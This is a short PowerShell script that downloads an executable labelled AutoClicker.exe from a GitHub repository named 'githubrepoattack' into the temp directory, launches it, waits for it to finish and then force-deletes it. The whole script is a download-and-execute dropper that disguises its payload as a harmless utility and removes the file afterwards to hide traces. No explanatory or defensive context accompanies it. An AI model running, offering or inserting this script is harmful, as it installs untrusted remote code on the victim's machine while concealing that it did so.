$path = "$env:TEMP\AutoClicker.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GazelleChamberNorthenImpact/githubrepoattack/main/AutoClicker.exe" -OutFile $path
$proc = Start-Process -FilePath $path -PassThru
$proc.WaitForExit()
Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
